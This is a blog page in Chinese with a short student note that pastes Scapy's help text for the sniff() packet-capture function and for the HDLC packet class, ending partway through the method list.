<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"j1nse.cool","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="j1nse&#39;s blog">
<meta property="og:url" content="http://j1nse.cool/index.html">
<meta property="og:site_name" content="j1nse&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="j1nse">
<meta property="article:tag" content="security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://j1nse.cool/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>j1nse's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">j1nse's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/06/09/scapy-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/06/09/scapy-learn/" class="post-title-link" itemprop="url">scapy乱七八糟</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-06-09 00:26:39 / 修改时间：14:00:24" itemprop="dateCreated datePublished" datetime="2019-06-09T00:26:39+08:00">2019-06-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>由于作业要用一下，随便记点啥<br>这是sniff的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Help on function sniff <span class="keyword">in</span> module scapy.sendrecv:</span><br><span class="line"></span><br><span class="line">sniff(count=<span class="number">0</span>, store=<span class="literal">True</span>, offline=<span class="literal">None</span>, prn=<span class="literal">None</span>, lfilter=<span class="literal">None</span>, L2socket=<span class="literal">None</span>, timeout=<span class="literal">None</span>, opened_socket=<span class="literal">None</span>, stop_filter=<span class="literal">None</span>, iface=<span class="literal">None</span>, started_callback=<span class="literal">None</span>, *arg,</span><br><span class="line"> **karg)</span><br><span class="line">    Sniff packets <span class="keyword">and</span> <span class="keyword">return</span> a list of packets.</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        count: number of packets to capture. <span class="number">0</span> means infinity.</span><br><span class="line">        store: whether to store sniffed packets <span class="keyword">or</span> discard them</span><br><span class="line">        prn: function to apply to each packet. If something <span class="keyword">is</span> returned, it</span><br><span class="line">             <span class="keyword">is</span> displayed.</span><br><span class="line">             --Ex: prn = <span class="keyword">lambda</span> x: x.summary()</span><br><span class="line">        filter: BPF filter to apply.</span><br><span class="line">        lfilter: Python function applied to each packet to determine <span class="keyword">if</span></span><br><span class="line">                 further action may be done.</span><br><span class="line">                 --Ex: lfilter = <span class="keyword">lambda</span> x: x.haslayer(Padding)</span><br><span class="line">        offline: PCAP file (<span class="keyword">or</span> list of PCAP files) to read packets <span class="keyword">from</span>,</span><br><span class="line">                 instead of sniffing them</span><br><span class="line">        timeout: stop sniffing after a given time (default: <span class="literal">None</span>).</span><br><span class="line">        L2socket: use the provided L2socket (default: use conf.L2listen).</span><br><span class="line">        opened_socket: provide an object (<span class="keyword">or</span> a list of objects) ready to use</span><br><span class="line">                      .recv() on.</span><br><span class="line">        stop_filter: Python function applied to each packet to determine <span class="keyword">if</span></span><br><span class="line">                     we have to stop the capture after this packet.</span><br><span class="line">                     --Ex: stop_filter = <span class="keyword">lambda</span> x: x.haslayer(TCP)</span><br><span class="line">        iface: interface <span class="keyword">or</span> list of interfaces (default: <span class="literal">None</span> <span class="keyword">for</span> sniffing</span><br><span class="line">               on all interfaces).</span><br><span class="line">        monitor: use monitor mode. May <span class="keyword">not</span> be available on all OS</span><br><span class="line">        started_callback: called <span class="keyword">as</span> soon <span class="keyword">as</span> the sniffer starts sniffing</span><br><span class="line">                          (default: <span class="literal">None</span>).</span><br><span class="line"></span><br><span class="line">    The iface, offline <span class="keyword">and</span> opened_socket parameters can be either an</span><br><span class="line">    element, a list of elements, <span class="keyword">or</span> a dict object mapping an element to a</span><br><span class="line">    label (see examples below).</span><br><span class="line"></span><br><span class="line">    Examples:</span><br><span class="line">      &gt;&gt;&gt; sniff(filter=<span class="string">"arp"</span>)</span><br><span class="line">      &gt;&gt;&gt; sniff(lfilter=<span class="keyword">lambda</span> pkt: ARP <span class="keyword">in</span> pkt)</span><br><span class="line">      &gt;&gt;&gt; sniff(iface=<span class="string">"eth0"</span>, prn=Packet.summary)</span><br><span class="line">      &gt;&gt;&gt; sniff(iface=[<span class="string">"eth0"</span>, <span class="string">"mon0"</span>],</span><br><span class="line">      ...       prn=<span class="keyword">lambda</span> pkt: <span class="string">"%s: %s"</span> % (pkt.sniffed_on,</span><br><span class="line">      ...                                   pkt.summary()))</span><br><span class="line">      &gt;&gt;&gt; sniff(iface=&#123;<span class="string">"eth0"</span>: <span class="string">"Ethernet"</span>, <span class="string">"mon0"</span>: <span class="string">"Wifi"</span>&#125;,</span><br><span class="line">      ...       prn=<span class="keyword">lambda</span> pkt: <span class="string">"%s: %s"</span> % (pkt.sniffed_on,</span><br><span class="line">      ...                                   pkt.summary()))</span><br></pre></td></tr></table></figure>
<hr>
<p>sniff返回的list里的成员对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br></pre></td><td class="code"><pre><span class="line">Help on HDLC in module scapy.layers.ppp object:</span><br><span class="line"></span><br><span class="line">class HDLC(scapy.packet.Packet)</span><br><span class="line">Help on HDLC in module scapy.layers.ppp object:</span><br><span class="line"></span><br><span class="line">class HDLC(scapy.packet.Packet)</span><br><span class="line"> |  Method resolution order:</span><br><span class="line"> |      HDLC</span><br><span class="line"> |      scapy.packet.Packet</span><br><span class="line"> |      scapy.base_classes.BasePacket</span><br><span class="line"> |      scapy.base_classes.Gen</span><br><span class="line"> |      scapy.base_classes._CanvasDumpExtended</span><br><span class="line"> |      __builtin__.object</span><br><span class="line"> |</span><br><span class="line"> |  Data and other attributes defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __all_slots__ &#x3D; set([&#39;_answered&#39;, &#39;_pkt&#39;, &#39;_tmp_dissect_pos&#39;, &#39;default...</span><br><span class="line"> |</span><br><span class="line"> |  aliastypes &#x3D; [&lt;class &#39;scapy.layers.ppp.HDLC&#39;&gt;, &lt;class &#39;scapy.packet.Pa...</span><br><span class="line"> |</span><br><span class="line"> |  fields_desc &#x3D; [&lt;Field (HDLC).address&gt;, &lt;Field (HDLC).control&gt;]</span><br><span class="line"> |</span><br><span class="line"> |  payload_guess &#x3D; [(&#123;&#125;, &lt;class &#39;scapy.layers.ppp.PPP&#39;&gt;)]</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Methods inherited from scapy.packet.Packet:</span><br><span class="line"> |</span><br><span class="line"> |  __bool__ &#x3D; __nonzero__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __bytes__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __contains__(self, cls)</span><br><span class="line"> |      &quot;cls in self&quot; returns true if self has a layer which is an instance of cls.</span><br><span class="line"> |</span><br><span class="line"> |  __deepcopy__(self, memo)</span><br><span class="line"> |      Used by copy.deepcopy</span><br><span class="line"> |</span><br><span class="line"> |  __delattr__(self, attr)</span><br><span class="line"> |</span><br><span class="line"> |  __delitem__(self, cls)</span><br><span class="line"> |</span><br><span class="line"> |  __dir__(self)</span><br><span class="line"> |      Add fields to tab completion list.</span><br><span class="line"> |</span><br><span class="line"> |  __div__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __eq__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __getattr__(self, attr)</span><br><span class="line"> |</span><br><span class="line"> |  __getitem__(self, cls)</span><br><span class="line"> |</span><br><span class="line"> |  __getstate__(self)</span><br><span class="line"> |      Mark object as pickable</span><br><span class="line"> |</span><br><span class="line"> |  __gt__(self, other)</span><br><span class="line"> |      True if other is an answer from self (self &#x3D;&#x3D;&gt; other).</span><br><span class="line"> |</span><br><span class="line"> |  __init__(self, _pkt&#x3D;&#39;&#39;, post_transform&#x3D;None, _internal&#x3D;0, _underlayer&#x3D;None, **fields)</span><br><span class="line"> |</span><br><span class="line"> |  __iter__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __iterlen__(self)</span><br><span class="line"> |      Predict the total length of the iterator</span><br><span class="line"> |</span><br><span class="line"> |  __len__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __lt__(self, other)</span><br><span class="line"> |      True if self is an answer from other (other &#x3D;&#x3D;&gt; self).</span><br><span class="line"> |</span><br><span class="line"> |  __mul__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __ne__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __nonzero__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __rdiv__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __reduce__(self)</span><br><span class="line"> |      Used by pickling methods</span><br><span class="line"> |</span><br><span class="line"> |  __reduce_ex__(self, proto)</span><br><span class="line"> |      Used by pickling methods</span><br><span class="line"> |</span><br><span class="line"> |  __repr__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __rmul__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __rtruediv__ &#x3D; __rdiv__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __setattr__(self, attr, val)</span><br><span class="line"> |</span><br><span class="line"> |  __setitem__(self, cls, val)</span><br><span class="line"> |</span><br><span class="line"> |  __setstate__(self, state)</span><br><span class="line"> |      Rebuild state using pickable methods</span><br><span class="line"> |</span><br><span class="line"> |  __str__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __truediv__ &#x3D; __div__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  add_payload(self, payload)</span><br><span class="line"> |</span><br><span class="line"> |  add_underlayer(self, underlayer)</span><br><span class="line"> |</span><br><span class="line"> |  answers(self, other)</span><br><span class="line"> |      DEV: true if self is an answer from other</span><br><span class="line"> |</span><br><span class="line"> |  build(self)</span><br><span class="line"> |      Create the current layer</span><br><span class="line"> |</span><br><span class="line"> |      :return: string of the packet with the payload</span><br><span class="line"> |</span><br><span class="line"> |  build_done(self, p)</span><br><span class="line"> |</span><br><span class="line"> |  build_padding(self)</span><br><span class="line"> |</span><br><span class="line"> |  build_ps(self, internal&#x3D;0)</span><br><span class="line"> |</span><br><span class="line"> |  canvas_dump(self, layer_shift&#x3D;0, rebuild&#x3D;1)</span><br><span class="line"> |</span><br><span class="line"> |  clear_cache(self)</span><br><span class="line"> |      Clear the raw packet cache for the field and all its subfields</span><br><span class="line"> |</span><br><span class="line"> |  clone_with(self, payload&#x3D;None, **kargs)</span><br><span class="line"> |</span><br><span class="line"> |  command(self)</span><br><span class="line"> |      Returns a string representing the command you have to type to</span><br><span class="line"> |      obtain the same packet</span><br><span class="line"> |</span><br><span class="line"> |  copy(self)</span><br><span class="line"> |      Returns a deep copy of the instance.</span><br><span class="line"> |</span><br><span class="line"> |  copy_field_value(self, fieldname, value)</span><br><span class="line"> |</span><br><span class="line"> |  copy_fields_dict(self, fields)</span><br><span class="line"> |</span><br><span class="line"> |  decode_payload_as(self, cls)</span><br><span class="line"> |      Reassembles the payload and decode it using another packet class</span><br><span class="line"> |</span><br><span class="line"> |  default_payload_class(self, payload)</span><br><span class="line"> |      DEV: Returns the default payload class if nothing has been found by the</span><br><span class="line"> |      guess_payload_class() method.</span><br><span class="line"> |</span><br><span class="line"> |      :param str payload: the layer&#39;s payload</span><br><span class="line"> |      :return: the default payload class define inside the configuration file</span><br><span class="line"> |</span><br><span class="line"> |  delfieldval(self, attr)</span><br><span class="line"> |</span><br><span class="line"> |  display(self, *args, **kargs)</span><br><span class="line"> |      Deprecated. Use show() method.</span><br><span class="line"> |</span><br><span class="line"> |  dissect(self, s)</span><br><span class="line"> |</span><br><span class="line"> |  dissection_done(self, pkt)</span><br><span class="line"> |      DEV: will be called after a dissection is completed</span><br><span class="line"> |</span><br><span class="line"> |  do_build(self)</span><br><span class="line"> |      Create the default version of the layer</span><br><span class="line"> |</span><br><span class="line"> |      :return: a string of the packet with the payload</span><br><span class="line"> |</span><br><span class="line"> |  do_build_payload(self)</span><br><span class="line"> |      Create the default version of the payload layer</span><br><span class="line"> |</span><br><span class="line"> |      :return: a string of payload layer</span><br><span class="line"> |</span><br><span class="line"> |  do_build_ps(self)</span><br><span class="line"> |</span><br><span class="line"> |  do_dissect(self, s)</span><br><span class="line"> |</span><br><span class="line"> |  do_dissect_payload(self, s)</span><br><span class="line"> |      Perform the dissection of the layer&#39;s payload</span><br><span class="line"> |</span><br><span class="line"> |      :param str s: the raw layer</span><br><span class="line"> |</span><br><span class="line"> |  do_init_cached_fields(self)</span><br><span class="line"> |      Initialize each fields of the fields_desc dict, or use the cached</span><br><span class="line"> |      fields information</span><br><span class="line"> |</span><br><span class="line"> |  do_init_fields(self, flist)</span><br><span class="line"> |      Initialize each fields of the fields_desc dict</span><br><span class="line"> |</span><br><span class="line"> |  extract_padding(self, s)</span><br><span class="line"> |      DEV: to be overloaded to extract current layer&#39;s padding.</span><br><span class="line"> |</span><br><span class="line"> |      :param str s: the current layer</span><br><span class="line"> |      :return: a couple of strings (actual layer, padding)</span><br><span class="line"> |</span><br><span class="line"> |  firstlayer(self)</span><br><span class="line"> |</span><br><span class="line"> |  fragment(self, *args, **kargs)</span><br><span class="line"> |</span><br><span class="line"> |  get_field(self, fld)</span><br><span class="line"> |      DEV: returns the field instance from the name of the field</span><br><span class="line"> |</span><br><span class="line"> |  getfield_and_val(self, attr)</span><br><span class="line"> |</span><br><span class="line"> |  getfieldval(self, attr)</span><br><span class="line"> |</span><br><span class="line"> |  getlayer(self, cls, nb&#x3D;1, _track&#x3D;None, _subclass&#x3D;None, **flt)</span><br><span class="line"> |      Return the nb^th layer that is an instance of cls, matching flt</span><br><span class="line"> |      values.</span><br><span class="line"> |</span><br><span class="line"> |  guess_payload_class(self, payload)</span><br><span class="line"> |      DEV: Guesses the next payload class from layer bonds.</span><br><span class="line"> |      Can be overloaded to use a different mechanism.</span><br><span class="line"> |</span><br><span class="line"> |      :param str payload: the layer&#39;s payload</span><br><span class="line"> |      :return: the payload class</span><br><span class="line"> |</span><br><span class="line"> |  hashret(self)</span><br><span class="line"> |      DEV: returns a string that has the same value for a request and its answer.</span><br><span class="line"> |</span><br><span class="line"> |  haslayer(self, cls)</span><br><span class="line"> |      true if self has a layer that is an instance of cls. Superseded by &quot;cls in self&quot; syntax.</span><br><span class="line"> |</span><br><span class="line"> |  hide_defaults(self)</span><br><span class="line"> |      Removes fields&#39; values that are the same as default values.</span><br><span class="line"> |</span><br><span class="line"> |  init_fields(self)</span><br><span class="line"> |      Initialize each fields of the fields_desc dict</span><br><span class="line"> |</span><br><span class="line"> |  lastlayer(self, layer&#x3D;None)</span><br><span class="line"> |      Returns the uppest layer of the packet</span><br><span class="line"> |</span><br><span class="line"> |  layers(self)</span><br><span class="line"> |      returns a list of layer classes (including subclasses) in this packet</span><br><span class="line"> |</span><br><span class="line"> |  mysummary(self)</span><br><span class="line"> |      DEV: can be overloaded to return a string that summarizes the layer.</span><br><span class="line"> |      Only one mysummary() is used in a whole packet summary: the one of the upper layer,  # noqa: E501</span><br><span class="line"> |      except if a mysummary() also returns (as a couple) a list of layers whose  # noqa: E501</span><br><span class="line"> |      mysummary() must be called if they are present.</span><br><span class="line"> |</span><br><span class="line"> |  post_build(self, pkt, pay)</span><br><span class="line"> |      DEV: called right after the current layer is build.</span><br><span class="line"> |</span><br><span class="line"> |      :param str pkt: the current packet (build by self_buil function)</span><br><span class="line"> |      :param str pay: the packet payload (build by do_build_payload function)</span><br><span class="line"> |      :return: a string of the packet with the payload</span><br><span class="line"> |</span><br><span class="line"> |  